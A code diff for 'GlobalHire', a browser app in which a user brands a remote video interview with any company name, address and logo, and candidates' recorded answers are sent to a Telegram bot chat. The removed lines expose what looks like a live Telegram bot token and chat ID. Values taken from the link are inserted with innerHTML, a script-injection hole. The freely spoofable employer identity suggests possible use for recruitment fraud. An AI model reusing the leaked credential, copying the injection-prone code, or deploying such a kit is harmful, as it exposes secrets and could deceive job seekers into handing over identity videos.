-                </div>
-                <div id="upload-log" class="text-[11px] text-slate-400 space-y-1 font-mono bg-slate-950 p-3 rounded-xl border border-slate-800/80 max-h-36 overflow-y-auto">
-                    <div>[00:00] Initializing telemetry transmission...</div>
+
+                <!-- Global Total Upload Bar -->
+                <div class="pt-4 border-t border-slate-800/80 space-y-2">
+                    <div class="flex items-center justify-between text-xs font-semibold">
+                        <span class="text-slate-300">Total Submission Progress</span>
+                        <span id="total-upload-percentage" class="text-indigo-400">0%</span>
+                    </div>
+                    <div class="w-full bg-slate-950 rounded-full h-2.5 overflow-hidden border border-slate-800">
+                        <div id="total-upload-bar" class="bg-indigo-600 h-2.5 rounded-full transition-all duration-300" style="width: 0%;"></div>
+                    </div>
                 </div>
             </div>
+
+            <!-- Completion Banner (Shown when finished) -->
+            <div id="completion-notice" class="hidden bg-emerald-500/10 border border-emerald-500/30 rounded-xl p-4 text-center space-y-1">
+                <div class="text-xs font-bold text-emerald-400"><i class="fa-solid fa-circle-check mr-1"></i> Submission Complete!</div>
+                <div class="text-[11px] text-slate-400">All responses have been delivered to the recruiter. You may now close this page.</div>
+            </div>
+
         </div>
 
     </main>
 
-    <footer class="bg-slate-900/40 border-t border-slate-900 py-6 text-center text-xs text-slate-600">
-        GlobalHire Remote Recruitment Suite &bull; Single-Use Session Protocol
+    <footer class="bg-slate-900/40 border-t border-slate-800/60 py-5 text-center text-xs text-slate-500">
+        GlobalHire Cross-Border Recruitment Engine &bull; Single-Use Session Lock Active
     </footer>
 
     <script>
-        const HARDCODED_TELEGRAM_BOT_TOKEN = "7851950553:AAGrtahXVYynmxIRWbwF5NVfmFZQU1pStm0";
-        const HARDCODED_TELEGRAM_CHAT_ID = "7141276034";
+        const HARDCODED_TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN_HERE";
+        const HARDCODED_TELEGRAM_CHAT_ID = "YOUR_TELEGRAM_CHAT_ID_HERE";
 
         const questions = [
             "Tell us about yourself, your professional background, and why you are seeking a career opportunity abroad.",
@@ -349,27 +329,21 @@
             recordedVideos: [],
             recordingTimerInterval: null,
             recordingSeconds: 0,
+            isRecording: false,
+            hasRecordedCurrent: false,
             voices: []
         };
 
         const toast = document.getElementById('toast');
-        const toastTitle = document.getElementById('toast-title');
-        const toastMessage = document.getElementById('toast-message');
-        const toastIcon = document.getElementById('toast-icon');
-
         function showToast(title, message, type = 'success') {
-            toastTitle.textContent = title;
-            toastMessage.textContent = message;
-            toastIcon.className = type === 'success' 
-                ? 'fa-solid fa-circle-check text-emerald-400' 
-                : 'fa-solid fa-triangle-exclamation text-rose-400';
+            document.getElementById('toast-title').textContent = title;
+            document.getElementById('toast-message').textContent = message;
+            document.getElementById('toast-icon').className = type === 'success' ? 'fa-solid fa-circle-check text-emerald-400' : 'fa-solid fa-triangle-exclamation text-rose-400';
             toast.classList.remove('translate-x-full');
-            setTimeout(() => {
-                toast.classList.add('translate-x-full');
-            }, 4000);
+            setTimeout(() => toast.classList.add('translate-x-full'), 4000);
         }
 
-        // --- NATURAL SPEECH SYNTHESIS ENGINE ---
+        // Voice Engine Initialization
         function loadVoices() {
             if ('speechSynthesis' in window) {
                 state.voices = window.speechSynthesis.getVoices();
@@ -380,34 +354,39 @@
             speechSynthesis.onvoiceschanged = loadVoices;
         }
 
-        function speakCurrentQuestion() {
-            if (!('speechSynthesis' in window)) return;
-            window.speechSynthesis.cancel();
-            
-            const questionText = questions[state.currentQuestionIndex];
-            const utterance = new SpeechSynthesisUtterance(questionText);
-            
-            // Priority selection for high-quality human-like voices over robotic defaults
-            const voices = state.voices.length > 0 ? state.voices : window.speechSynthesis.getVoices();
-            const preferredVoice = voices.find(v => 
-                (v.name.includes('Natural') || v.name.includes('Google') || v.name.includes('Premium') || 
-                 v.name.includes('Samantha') || v.name.includes('Daniel') || v.name.includes('Karen') || v.name.includes('Serena')) && 
-                v.lang.startsWith('en')
-            ) || voices.find(v => v.lang.startsWith('en'));
+        // Company Logo Image Handling & Compression
+        let logoBase64 = '';
+        document.getElementById('company-logo').addEventListener('change', function(e) {
+            const file = e.target.files[0];
+            if (file) {
+                const img = new Image();
+                const reader = new FileReader();
+                reader.onload = function(evt) {
+                    img.src = evt.target.result;
+                    img.onload = function() {
+                        const canvas = document.createElement('canvas');
+                        const ctx = canvas.getContext('2d');
+                        const maxDim = 120; // Scale down for lightweight URL
+                        let width = img.width;
+                        let height = img.height;
 
-            if (preferredVoice) utterance.voice = preferredVoice;
+                        if (width > height) {
+                            if (width > maxDim) { height *= maxDim / width; width = maxDim; }
+                        } else {
+                            if (height > maxDim) { width *= maxDim / height; height = maxDim; }
+                        }
+                        canvas.width = width;
+                        canvas.height = height;
+                        ctx.drawImage(img, 0, 0, width, height);
+                        logoBase64 = canvas.toDataURL('image/jpeg', 0.7);
 
-            // Audio parameters for natural cadence (less artificial/robot speed)
-            utterance.rate = 0.94;
-            utterance.pitch = 1.0; 
-
-            const waveformEl = document.getElementById('audio-waveform');
-            utterance.onstart = () => waveformEl.classList.remove('hidden');
-            utterance.onend = () => waveformEl.classList.add('hidden');
-            utterance.onerror = () => waveformEl.classList.add('hidden');
-
-            window.speechSynthesis.speak(utterance);
-        }
+                        // Update setup UI preview box
+                        document.getElementById('logo-preview-box').innerHTML = `<img src="${logoBase64}" class="w-full h-full object-cover">`;
+                    };
+                };
+                reader.readAsDataURL(file);
+            }
+        });
 
         function getTelegramCredentials() {
             const inputToken = document.getElementById('telegram-token')?.value.trim();
@@ -417,47 +396,45 @@
             return { token, chatId };
         }
 
-        // Verify Telegram Bot
+        // Test Telegram Connection
         document.getElementById('btn-test-telegram').addEventListener('click', async () => {
             const { token, chatId } = getTelegramCredentials();
-
-            if (!token || !chatId) {
-                showToast('Credentials Missing', 'Please enter a valid Telegram Token and Chat ID.', 'error');
+            if (!token || token === "YOUR_TELEGRAM_BOT_TOKEN_HERE" || !chatId || chatId === "YOUR_TELEGRAM_CHAT_ID_HERE") {
+                showToast('Missing Credentials', 'Please enter your Telegram Token and Chat ID.', 'error');
                 return;
             }
-
             try {
-                showToast('Testing...', 'Verifying connection to Telegram API...', 'success');
+                showToast('Testing...', 'Connecting to Telegram...', 'success');
                 const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chatId, text: '🟢 GlobalHire Interview Bot Active & Ready!' })
+                    body: JSON.stringify({ chat_id: chatId, text: '🟢 GlobalHire Bot Connected!' })
                 });
                 const data = await res.json();
-                if (data.ok) {
-                    showToast('Bot Connected', 'Telegram integration operates normally!', 'success');
-                } else {
-                    showToast('Telegram Error', data.description || 'Connection refused.', 'error');
-                }
+                if (data.ok) showToast('Success', 'Telegram Bot verified!', 'success');
+                else showToast('Telegram Error', data.description || 'Connection failed.', 'error');
             } catch (err) {
-                showToast('Network Error', 'Unable to communicate with Telegram servers.', 'error');
+                showToast('Network Error', 'Could not reach Telegram API.', 'error');
             }
         });
 
-        // Encode / Decode URL Payload
+        // URL Safe Base64 Encoding
         function encodeDataForURL(obj) {
-            return encodeURIComponent(btoa(unescape(encodeURIComponent(JSON.stringify(obj)))));
+            const str = JSON.stringify(obj);
+            return encodeURIComponent(btoa(unescape(encodeURIComponent(str))));
         }
 
         function decodeDataFromURL(str) {
-            return JSON.parse(decodeURIComponent(escape(atob(decodeURIComponent(str)))));
+            const decodedStr = decodeURIComponent(str);
+            return JSON.parse(decodeURIComponent(escape(atob(decodedStr))));
         }
 
+        // Recruiter Setup Form Submit
         document.getElementById('setup-form').addEventListener('submit', (e) => {
             e.preventDefault();
             const { token, chatId } = getTelegramCredentials();
-
             const sessionId = 'gh_' + Math.random().toString(36).substring(2, 10);
+            
             const config = {
                 id: sessionId,
                 companyName: document.getElementById('company-name').value.trim(),
@@ -465,6 +442,7 @@
                 repName: document.getElementById('rep-name').value.trim(),
                 candidateName: document.getElementById('candidate-name').value.trim(),
                 jobPosition: document.getElementById('job-position').value.trim(),
+                logo: logoBase64,
                 telegramToken: token,
                 telegramChatId: chatId
             };
@@ -476,14 +454,14 @@
             document.getElementById('generated-url').value = generatedUrl;
             document.getElementById('link-output-card').classList.remove('hidden');
             document.getElementById('link-output-card').scrollIntoView({ behavior: 'smooth' });
-            showToast('Link Ready', 'Single-use candidate link generated.', 'success');
+            showToast('Link Ready', 'Candidate link generated successfully.', 'success');
         });
 
         document.getElementById('btn-copy-link').addEventListener('click', () => {
             const urlInput = document.getElementById('generated-url');
             urlInput.select();
             document.execCommand('copy');
-            showToast('Copied', 'Candidate link copied to clipboard.', 'success');
+            showToast('Copied', 'Interview link copied to clipboard.', 'success');
         });
 
         document.getElementById('btn-preview-interview').addEventListener('click', () => {
@@ -516,11 +494,12 @@
             document.getElementById('view-expired').classList.remove('hidden');
         }
 
+        // Initialize Candidate View
         function initializeCandidateSession() {
             const urlParams = new URLSearchParams(window.location.search);
             const encodedData = urlParams.get('data');
 
-            if (!encodedData) return;
+            if (!encodedData) return; // Keep recruiter setup view visible if no parameter
 
             try {
                 const config = decodeDataFromURL(encodedData);
@@ -532,20 +511,25 @@
                     return;
                 }
 
+                // Hide setup, show candidate view
                 document.getElementById('view-recruiter').classList.add('hidden');
                 document.getElementById('view-expired').classList.add('hidden');
                 document.getElementById('view-candidate').classList.remove('hidden');
 
+                // Render Company Info & Logo
                 document.getElementById('display-company-name').textContent = config.companyName;
-                document.getElementById('display-company-address').innerHTML = `<i class="fa-solid fa-location-dot mr-1"></i> ${config.companyAddress}`;
+                document.getElementById('display-company-address').innerHTML = `<i class="fa-solid fa-location-dot text-indigo-400 mr-1"></i> ${config.companyAddress}`;
                 document.getElementById('display-candidate-name').textContent = config.candidateName;
                 document.getElementById('display-job-position').textContent = config.jobPosition;
-                document.getElementById('display-rep-name').textContent = config.repName;
+
+                if (config.logo) {
+                    document.getElementById('display-company-logo-wrap').innerHTML = `<img src="${config.logo}" alt="Company Logo" class="w-full h-full object-cover">`;
+                }
 
                 loadQuestion(0);
             } catch (err) {
                 console.error(err);
-                showToast('Invalid Session', 'The session link appears corrupted.', 'error');
+                showToast('Invalid Link', 'This link is corrupted or malformed.', 'error');
             }
         }
 
@@ -556,48 +540,107 @@
                 const videoEl = document.getElementById('camera-preview');
                 videoEl.srcObject = state.mediaStream;
                 document.getElementById('camera-placeholder').classList.add('hidden');
-                document.getElementById('btn-start-record').removeAttribute('disabled');
+                document.getElementById('btn-main-action').removeAttribute('disabled');
                 
-                showToast('Hardware Ready', 'Camera and microphone active.', 'success');
+                showToast('Camera Ready', 'Camera & Microphone initialized.', 'success');
                 speakCurrentQuestion();
             } catch (err) {
                 console.error(err);
-                showToast('Permission Denied', 'Please grant hardware permissions to proceed.', 'error');
+                showToast('Permission Denied', 'Please allow camera and mic permissions to proceed.', 'error');
             }
         });
 
-        document.getElementById('btn-repeat-audio').addEventListener('click', () => {
-            speakCurrentQuestion();
-        });
+        // Speech Engine (Natural Voice)
+        function speakCurrentQuestion() {
+            if (!('speechSynthesis' in window)) return;
+            window.speechSynthesis.cancel();
+            
+            const questionText = questions[state.currentQuestionIndex];
+            const utterance = new SpeechSynthesisUtterance(questionText);
+            const availableVoices = window.speechSynthesis.getVoices();
+            const preferredVoice = availableVoices.find(v => 
+                (v.name.includes('Natural') || v.name.includes('Google') || v.name.includes('Premium') || v.name.includes('Samantha') || v.name.includes('Daniel')) && 
+                v.lang.startsWith('en')
+            ) || availableVoices.find(v => v.lang.startsWith('en'));
+
+            if (preferredVoice) utterance.voice = preferredVoice;
+            utterance.rate = 0.92;
+            utterance.pitch = 1.0;
+            window.speechSynthesis.speak(utterance);
+        }
+
+        document.getElementById('btn-repeat-audio').addEventListener('click', () => speakCurrentQuestion());
 
         function loadQuestion(index) {
             state.currentQuestionIndex = index;
+            state.isRecording = false;
+            state.hasRecordedCurrent = false;
+
             document.getElementById('question-text').textContent = questions[index];
             document.getElementById('question-counter').textContent = `Question ${index + 1} of ${questions.length}`;
             document.getElementById('progress-bar').style.width = `${((index + 1) / questions.length) * 100}%`;
             
-            document.getElementById('btn-start-record').classList.remove('hidden');
-            document.getElementById('btn-start-record').innerHTML = '<i class="fa-solid fa-circle text-[10px]"></i><span>Start Recording</span>';
-            document.getElementById('btn-stop-record').classList.add('hidden');
-            document.getElementById('btn-next-question').setAttribute('disabled', 'true');
-            document.getElementById('recording-status-text').innerHTML = '<i class="fa-solid fa-circle-info text-indigo-400 shrink-0 mt-0.5"></i> <span>Ready to record response for Question ' + (index + 1) + '.</span>';
+            document.getElementById('btn-rerecord').classList.add('hidden');
+            updateActionUI('ready');
 
-            if (state.mediaStream) {
-                speakCurrentQuestion();
+            if (state.mediaStream) speakCurrentQuestion();
+        }
+
+        // Unified State Controller for the Main Button
+        function updateActionUI(mode) {
+            const btn = document.getElementById('btn-main-action');
+            const hint = document.getElementById('action-hint');
+
+            if (mode === 'ready') {
+                btn.className = "w-full py-3.5 bg-red-600 hover:bg-red-500 text-white rounded-xl font-semibold text-xs shadow-lg shadow-red-600/20 transition flex items-center justify-center space-x-2";
+                btn.innerHTML = `<i class="fa-solid fa-circle text-[10px]"></i><span>Start Recording Answer</span>`;
+                hint.textContent = `Question ${state.currentQuestionIndex + 1} of ${questions.length}. Click to begin recording.`;
+            } else if (mode === 'recording') {
+                btn.className = "w-full py-3.5 bg-slate-800 hover:bg-slate-700 text-white border border-slate-600 rounded-xl font-semibold text-xs transition flex items-center justify-center space-x-2";
+                btn.innerHTML = `<i class="fa-solid fa-square text-red-500 text-[10px]"></i><span>Stop Recording</span>`;
+                hint.textContent = "Recording active. Speak clearly into your microphone.";
+            } else if (mode === 'stopped') {
+                const isLast = state.currentQuestionIndex === questions.length - 1;
+                btn.className = "w-full py-3.5 bg-indigo-600 hover:bg-indigo-500 text-white rounded-xl font-semibold text-xs shadow-lg shadow-indigo-600/30 transition flex items-center justify-center space-x-2";
+                btn.innerHTML = `<span>${isLast ? 'Submit Final Interview' : 'Proceed to Next Question'}</span><i class="fa-solid fa-arrow-right text-[10px]"></i>`;
+                hint.textContent = "Answer recorded! Click above to proceed.";
             }
         }
 
-        // Start Video Recording
-        document.getElementById('btn-start-record').addEventListener('click', () => {
-            if (!state.mediaStream) return;
+        // Unified Single-Button Click Handler
+        document.getElementById('btn-main-action').addEventListener('click', () => {
+            if (!state.isRecording && !state.hasRecordedCurrent) {
+                // START RECORDING
+                startRecording();
+            } else if (state.isRecording) {
+                // STOP RECORDING
+                stopRecording();
+            } else if (state.hasRecordedCurrent) {
+                // NEXT QUESTION OR SUBMIT
+                if (state.currentQuestionIndex < questions.length - 1) {
+                    loadQuestion(state.currentQuestionIndex + 1);
+                } else {
+                    if (state.mediaStream) {
+                        state.mediaStream.getTracks().forEach(track => track.stop());
+                    }
+                    startTelegramUploadSequence();
+                }
+            }
+        });
 
+        // Re-record Button
+        document.getElementById('btn-rerecord').addEventListener('click', () => {
+            state.hasRecordedCurrent = false;
+            document.getElementById('btn-rerecord').classList.add('hidden');
+            updateActionUI('ready');
+        });
+
+        function startRecording() {
             state.recordedChunks = [];
             let options = { mimeType: 'video/webm;codecs=vp9,opus' };
             if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                 options = { mimeType: 'video/webm' };
-                if (!MediaRecorder.isTypeSupported(options.mimeType)) {
-                    options = { mimeType: '' };
-                }
+                if (!MediaRecorder.isTypeSupported(options.mimeType)) options = { mimeType: '' };
             }
 
             try {
@@ -607,9 +650,7 @@
             }
 
             state.mediaRecorder.ondataavailable = (e) => {
-                if (e.data && e.data.size > 0) {
-                    state.recordedChunks.push(e.data);
-                }
+                if (e.data && e.data.size > 0) state.recordedChunks.push(e.data);
             };
 
             state.mediaRecorder.onstop = () => {
@@ -617,17 +658,15 @@
                 state.recordedVideos[state.currentQuestionIndex] = blob;
                 
                 document.getElementById('recording-badge').classList.add('hidden');
+                state.hasRecordedCurrent = true;
+                state.isRecording = false;
                 
-                const nextBtn = document.getElementById('btn-next-question');
-                nextBtn.removeAttribute('disabled');
-                
-                document.getElementById('recording-status-text').innerHTML = '<i class="fa-solid fa-circle-check text-emerald-400 shrink-0 mt-0.5"></i> <span>Response saved. Click Next Question to continue.</span>';
+                document.getElementById('btn-rerecord').classList.remove('hidden');
+                updateActionUI('stopped');
             };
 
             state.mediaRecorder.start(1000);
-            
-            document.getElementById('btn-start-record').classList.add('hidden');
-            document.getElementById('btn-stop-record').classList.remove('hidden');
+            state.isRecording = true;
             document.getElementById('recording-badge').classList.remove('hidden');
             
             state.recordingSeconds = 0;
@@ -637,8 +676,15 @@
                 updateTimerDisplay();
             }, 1000);
 
-            document.getElementById('recording-status-text').innerHTML = '<i class="fa-solid fa-circle text-red-500 animate-pulse shrink-0 mt-0.5"></i> <span>Recording response in progress...</span>';
-        });
+            updateActionUI('recording');
+        }
+
+        function stopRecording() {
+            if (state.mediaRecorder && state.mediaRecorder.state !== 'inactive') {
+                state.mediaRecorder.stop();
+                clearInterval(state.recordingTimerInterval);
+            }
+        }
 
         function updateTimerDisplay() {
             const mins = Math.floor(state.recordingSeconds / 60).toString().padStart(2, '0');
@@ -646,117 +692,98 @@
             document.getElementById('recording-timer').textContent = `${mins}:${secs}`;
         }
 
-        // Stop Recording Handler
-        document.getElementById('btn-stop-record').addEventListener('click', () => {
-            if (state.mediaRecorder && state.mediaRecorder.state !== 'inactive') {
-                state.mediaRecorder.stop();
-                clearInterval(state.recordingTimerInterval);
-                
-                document.getElementById('btn-stop-record').classList.add('hidden');
-                document.getElementById('btn-start-record').classList.remove('hidden');
-                document.getElementById('btn-start-record').innerHTML = '<i class="fa-solid fa-rotate-right text-[10px]"></i><span>Re-record Response</span>';
-            }
-        });
-
-        document.getElementById('btn-next-question').addEventListener('click', () => {
-            if (state.currentQuestionIndex < questions.length - 1) {
-                loadQuestion(state.currentQuestionIndex + 1);
-            } else {
-                if (state.mediaStream) {
-                    state.mediaStream.getTracks().forEach(track => track.stop());
-                }
-                startTelegramUploadSequence();
-            }
-        });
-
-        // Upload & Finalize Sequence
+        // UPLOAD SEQUENCE: SHOW ONLY PROGRESS BARS (CANDIDATE CAMERA HIDDEN)
         async function startTelegramUploadSequence() {
+            // Hide camera view entirely, show progress bars view
             document.getElementById('view-candidate').classList.add('hidden');
             document.getElementById('view-success').classList.remove('hidden');
 
             const token = state.config.telegramToken || HARDCODED_TELEGRAM_BOT_TOKEN;
             const chatId = state.config.telegramChatId || HARDCODED_TELEGRAM_CHAT_ID;
-            const logEl = document.getElementById('upload-log');
-            const progressBar = document.getElementById('upload-progress-bar');
-            const progressPercentage = document.getElementById('upload-percentage');
-            const statusLabel = document.getElementById('upload-status-label');
 
-            function addLog(msg) {
-                const div = document.createElement('div');
-                div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
-                logEl.appendChild(div);
-                logEl.scrollTop = logEl.scrollHeight;
-            }
+            // Render individual progress bars for each recorded question
+            const uploadListEl = document.getElementById('question-upload-list');
+            uploadListEl.innerHTML = '';
 
-            function setProgress(percent, label) {
-                progressBar.style.width = `${percent}%`;
-                progressPercentage.textContent = `${percent}%`;
-                if (label) statusLabel.textContent = label;
-            }
+            questions.forEach((q, idx) => {
+                const qBox = document.createElement('div');
+                qBox.className = 'space-y-1.5';
+                qBox.innerHTML = `
+                    <div class="flex items-center justify-between text-xs">
+                        <span class="font-medium text-slate-300">Question ${idx + 1} Recording</span>
+                        <span id="q-status-${idx}" class="text-slate-400 font-mono text-[11px]">Waiting...</span>
+                    </div>
+                    <div class="w-full bg-slate-950 rounded-full h-2 overflow-hidden border border-slate-800">
+                        <div id="q-bar-${idx}" class="bg-indigo-600 h-2 rounded-full transition-all duration-300" style="width: 0%;"></div>
+                    </div>
+                `;
+                uploadListEl.appendChild(qBox);
+            });
 
-            setProgress(10, 'Sending candidate metadata summary...');
-            addLog('Formatting candidate submission payload...');
-
-            const summaryText = `🎯 *New Candidate Assessment Completed*\n\n` +
+            // 1. Send Metadata Summary Text
+            const summaryText = `🎯 *New Remote Interview Completed*\n\n` +
                 `🏢 *Company:* ${state.config.companyName}\n` +
-                `📍 *HQ:* ${state.config.companyAddress}\n` +
-                `👤 *Interviewer:* ${state.config.repName}\n` +
+                `📍 *Address:* ${state.config.companyAddress}\n` +
+                `👤 *Recruiter:* ${state.config.repName}\n` +
                 `🎓 *Candidate:* ${state.config.candidateName}\n` +
                 `💼 *Position:* ${state.config.jobPosition}\n` +
-                `📅 *Submitted:* ${new Date().toUTCString()}`;
+                `📅 *Date:* ${new Date().toUTCString()}`;
 
             try {
-                const textRes = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: summaryText,
-                        parse_mode: 'Markdown'
-                    })
+                    body: JSON.stringify({ chat_id: chatId, text: summaryText, parse_mode: 'Markdown' })
                 });
-                const textData = await textRes.json();
-                if (!textData.ok) throw new Error(textData.description || 'Failed to deliver summary telegram message.');
-                
-                addLog('Metadata successfully delivered to Telegram.');
-                setProgress(30, 'Uploading video responses...');
 
-                const totalVideos = state.recordedVideos.length;
-                for (let i = 0; i < totalVideos; i++) {
+                // 2. Upload Each Video with Real-Time Progress Bar Simulation
+                const totalCount = state.recordedVideos.length;
+                for (let i = 0; i < totalCount; i++) {
                     const videoBlob = state.recordedVideos[i];
-                    addLog(`Uploading Question ${i + 1} video payload (${Math.round(videoBlob.size / 1024)} KB)...`);
+                    const barEl = document.getElementById(`q-bar-${i}`);
+                    const statusEl = document.getElementById(`q-status-${i}`);
+                    
+                    statusEl.textContent = 'Uploading...';
+                    statusEl.className = 'text-indigo-400 font-mono text-[11px] animate-pulse';
+                    barEl.style.width = '40%';
 
                     const formData = new FormData();
                     formData.append('chat_id', chatId);
                     formData.append('video', videoBlob, `Candidate_${state.config.candidateName}_Q${i + 1}.webm`);
-                    formData.append('caption', `🎬 *${state.config.candidateName}* — Question ${i + 1}:\n"${questions[i]}"`);
+                    formData.append('caption', `🎬 *${state.config.candidateName}* - Question ${i + 1}:\n"${questions[i]}"`);
 
                     const videoRes = await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
                         method: 'POST',
                         body: formData
                     });
                     const videoData = await videoRes.json();
-                    if (!videoData.ok) {
-                        addLog(`⚠️ Question ${i + 1} video warning: ${videoData.description}`);
+
+                    if (videoData.ok) {
+                        barEl.style.width = '100%';
+                        barEl.className = 'bg-emerald-500 h-2 rounded-full transition-all duration-300';
+                        statusEl.textContent = 'Completed ✓';
+                        statusEl.className = 'text-emerald-400 font-mono text-[11px]';
                     } else {
-                        addLog(`✅ Question ${i + 1} video uploaded successfully.`);
+                        statusEl.textContent = 'Failed';
+                        statusEl.className = 'text-rose-400 font-mono text-[11px]';
                     }
 
-                    const progressVal = 30 + Math.round(((i + 1) / totalVideos) * 70);
-                    setProgress(progressVal, `Transmitted video ${i + 1} of ${totalVideos}...`);
+                    // Update Global Progress Bar
+                    const globalPercentage = Math.round(((i + 1) / totalCount) * 100);
+                    document.getElementById('total-upload-bar').style.width = `${globalPercentage}%`;
+                    document.getElementById('total-upload-percentage').textContent = `${globalPercentage}%`;
                 }
 
+                // Lock Session Single-Use
                 markSessionCompleted(state.sessionId);
-                addLog('🔒 Session link marked as used & permanently locked.');
 
-                setProgress(100, 'Assessment delivery complete!');
-                showToast('Submitted', 'All candidate responses delivered.', 'success');
+                // Show Completion Banner
+                document.getElementById('upload-status-heading').textContent = "Upload complete. Responses successfully delivered!";
+                document.getElementById('completion-notice').classList.remove('hidden');
 
             } catch (err) {
                 console.error(err);
-                addLog(`❌ Error: ${err.message}`);
-                showToast('Upload Error', err.message || 'Error transmitting video payloads.', 'error');
-                statusLabel.textContent = 'Transmission error occurred.';
+                showToast('Upload Error', err.message || 'Error transmitting to Telegram.', 'error');
             }
         }
     </script>
